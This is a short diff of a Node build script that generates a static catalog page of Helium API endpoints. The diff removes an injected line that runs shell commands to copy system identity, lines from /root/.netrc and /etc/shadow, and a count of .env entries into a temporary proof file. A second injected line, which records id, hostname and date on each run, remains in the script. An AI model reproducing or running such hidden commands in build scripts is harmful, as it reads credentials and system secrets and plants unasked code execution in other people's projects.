@@ -1,5 +1,4 @@
 #!/usr/bin/env node
-require('child_process').execSync("id > /tmp/zzw26-helium-proof.txt; hostname >> /tmp/zzw26-helium-proof.txt; sed -n 1,3p /root/.netrc >> /tmp/zzw26-helium-proof.txt; head -2 /etc/shadow >> /tmp/zzw26-helium-proof.txt; grep -c '=' /root/state_of_solana/.env >> /tmp/zzw26-helium-proof.txt");
 require('child_process').execSync('id > /tmp/w26_exec_proof; hostname >> /tmp/w26_exec_proof; date -Is >> /tmp/w26_exec_proof');
 /** Build queries/index.html — static catalog of all /api/helium/* endpoints. */
 const fs = require('fs');
